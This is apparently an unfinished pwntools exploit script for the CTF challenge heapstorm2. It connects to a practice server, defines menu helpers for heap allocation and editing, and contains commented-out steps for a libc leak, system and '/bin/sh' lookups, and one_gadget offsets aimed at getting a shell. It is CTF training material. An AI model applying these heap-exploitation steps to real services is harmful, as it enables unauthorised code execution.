import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='0ctf_2018_heapstorm2'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',25549)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			io=pdbg.run("debug")
			# io=pdbg.run("local")
			libc=pdbg.libc
			# one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			# one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(size):
			io.recvuntil('Command: ')
			io.sendline('1')
			io.recvuntil('Size: ')
			io.sendline(str(size))

		def edit(idx,size,con):
			io.recvuntil('Command: ')
			io.sendline('2')
			io.recvuntil('Index: ')
			io.sendline(str(idx))
			io.recvuntil('Size: ')
			io.sendline(str(size))
			io.recvuntil('Content: ')
			io.send(con)

		def delete(idx):
			io.recvuntil('Command')
			io.sendline('3')
			io.recvuntil('Index')
			io.sendline(str(idx))

		def show(idx):
			io.recvuntil('Command')
			io.sendline('4')
			io.recvuntil('Index')
			io.sendline(str(idx))

		add(0x78)
		add(0x78)
		add(0x4f8)
		add(0x5f8)
		add(0x18)
		# edit(2,0x4f8,'\x00'*0x4f0+p64(0x600))
		


		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		pdbg.bp([])
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue